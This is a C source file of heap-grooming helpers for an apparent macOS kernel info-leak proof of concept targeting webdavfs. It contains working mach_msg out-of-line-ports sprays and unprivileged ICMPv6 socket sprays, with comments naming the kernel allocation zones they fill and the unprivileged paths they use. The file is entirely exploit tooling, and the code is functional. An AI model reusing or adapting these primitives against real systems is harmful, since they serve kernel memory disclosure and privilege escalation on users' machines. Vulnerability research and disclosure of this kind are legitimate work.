/*
 * spray.c -- heap-grooming helpers for the webdavfs stale-heap info-leak PoC.
 */

#include "spray.h"

#ifdef __APPLE__

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

#include <mach/mach.h>

/* ------------------------------------------------------------------ */
/* (a) mach_msg OOL-ports spray                                       */
/* ------------------------------------------------------------------ */

struct port_spray {
    mach_port_t  marker;        /* receive right + inserted send right    */
    mach_port_t *holders;       /* one queue-holding port per message     */
    mach_port_t *descs;         /* userland descriptor array (all marker) */
    uint32_t     n_holders;
    uint32_t     n_queued;
    uint32_t     descs_per_msg;
};

struct ool_ports_msg {
    mach_msg_header_t               head;
    mach_msg_body_t                 body;
    mach_msg_ool_ports_descriptor_t desc;
};

port_spray_t *
ool_ports_spray_start(uint32_t n_messages, uint32_t descs_per_msg)
{
    port_spray_t *s;
    mach_port_t self = mach_task_self();
    kern_return_t kr;
    uint32_t i;

    s = calloc(1, sizeof(*s));
    if (s == NULL)
        return NULL;
    s->holders = calloc(n_messages, sizeof(mach_port_t));
    s->descs = malloc((size_t)descs_per_msg * sizeof(mach_port_t));
    if (s->holders == NULL || s->descs == NULL) {
        fprintf(stderr, "[spray] ool_ports: allocation failed\n");
        ool_ports_spray_destroy(s);
        return NULL;
    }

    kr = mach_port_allocate(self, MACH_PORT_RIGHT_RECEIVE, &s->marker);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "[spray] ool_ports: marker allocate: %s\n",
                mach_error_string(kr));
        ool_ports_spray_destroy(s);
        return NULL;
    }
    kr = mach_port_insert_right(self, s->marker, s->marker,
                                MACH_MSG_TYPE_MAKE_SEND);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "[spray] ool_ports: insert send right: %s\n",
                mach_error_string(kr));
        ool_ports_spray_destroy(s);
        return NULL;
    }
    for (i = 0; i < descs_per_msg; i++)
        s->descs[i] = s->marker;

    for (i = 0; i < n_messages; i++) {
        struct ool_ports_msg msg;

        kr = mach_port_allocate(self, MACH_PORT_RIGHT_RECEIVE,
                                &s->holders[i]);
        if (kr != KERN_SUCCESS) {
            fprintf(stderr, "[spray] ool_ports: holder %u allocate: %s "
                    "(queued %u)\n", i, mach_error_string(kr), s->n_queued);
            break;
        }
        s->n_holders = i + 1;

        memset(&msg, 0, sizeof(msg));
        msg.head.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0)
                           | MACH_MSGH_BITS_COMPLEX;
        msg.head.msgh_size = (mach_msg_size_t)sizeof(msg);
        msg.head.msgh_remote_port = s->holders[i];
        msg.head.msgh_local_port = MACH_PORT_NULL;
        msg.head.msgh_id = 0x504f4f4c; /* 'POOL' */
        msg.body.msgh_descriptor_count = 1;
        msg.desc.address = s->descs;
        msg.desc.count = descs_per_msg;
        msg.desc.deallocate = FALSE;
        msg.desc.copy = MACH_MSG_VIRTUAL_COPY;
        msg.desc.disposition = MACH_MSG_TYPE_COPY_SEND;
        msg.desc.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;

        kr = mach_msg(&msg.head, MACH_SEND_MSG, (mach_msg_size_t)sizeof(msg),
                      0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE,
                      MACH_PORT_NULL);
        if (kr != KERN_SUCCESS) {
            fprintf(stderr, "[spray] ool_ports: send %u: %s (queued %u)\n",
                    i, mach_error_string(kr), s->n_queued);
            break;
        }
        s->n_queued++;
    }

    fprintf(stderr, "[spray] ool_ports: queued %u msgs x %u descs "
            "(~%zu bytes/msg kalloc_large, marker port name 0x%x)\n",
            s->n_queued, descs_per_msg,
            (size_t)descs_per_msg * sizeof(uint64_t), s->marker);
    return s;
}

void
ool_ports_spray_destroy(port_spray_t *s)
{
    mach_port_t self = mach_task_self();
    uint32_t i;

    if (s == NULL)
        return;
    /* Dropping the receive right destroys the port and every queued
     * message, which frees the kernel-side kalloc_large ipc_port
     * pointer arrays. */
    if (s->holders != NULL) {
        for (i = 0; i < s->n_holders; i++) {
            if (MACH_PORT_VALID(s->holders[i]))
                mach_port_mod_refs(self, s->holders[i],
                                   MACH_PORT_RIGHT_RECEIVE, -1);
        }
        free(s->holders);
    }
    if (MACH_PORT_VALID(s->marker)) {
        mach_port_mod_refs(self, s->marker, MACH_PORT_RIGHT_SEND, -1);
        mach_port_mod_refs(self, s->marker, MACH_PORT_RIGHT_RECEIVE, -1);
    }
    free(s->descs);
    free(s);
}

/* ------------------------------------------------------------------ */
/* (b) ICMPv6 raw-socket (inpcb) spray                                */
/* ------------------------------------------------------------------ */

struct inpcb_spray {
    int *fds;
    int  n;
};

inpcb_spray_t *
inpcb_spray_start(int n_sockets)
{
    inpcb_spray_t *s;
    int i;

    s = calloc(1, sizeof(*s));
    if (s == NULL)
        return NULL;
    s->fds = malloc((size_t)n_sockets * sizeof(int));
    if (s->fds == NULL) {
        free(s);
        return NULL;
    }

    for (i = 0; i < n_sockets; i++) {
        /* SOCK_DGRAM ICMPv6 ("ping" socket): unprivileged on macOS and
         * lands in the same ripcbinfo inpcb table as raw sockets
         * (icmp6_dgram_attach -> in_pcballoc(&ripcbinfo)). */
        int fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
        if (fd < 0) {
            if (i == 0)
                fprintf(stderr, "[spray] inpcb: socket: %s\n",
                        strerror(errno));
            break;
        }
        s->fds[s->n++] = fd;
    }
    fprintf(stderr, "[spray] inpcb: opened %d ICMPv6 dgram sockets\n", s->n);
    return s;
}

int
inpcb_spray_count(const inpcb_spray_t *s)
{
    return s ? s->n : 0;
}

void
inpcb_spray_destroy(inpcb_spray_t *s)
{
    int i;

    if (s == NULL)
        return;
    for (i = 0; i < s->n; i++)
        close(s->fds[i]);
    free(s->fds);
    free(s);
}

#endif /* __APPLE__ */
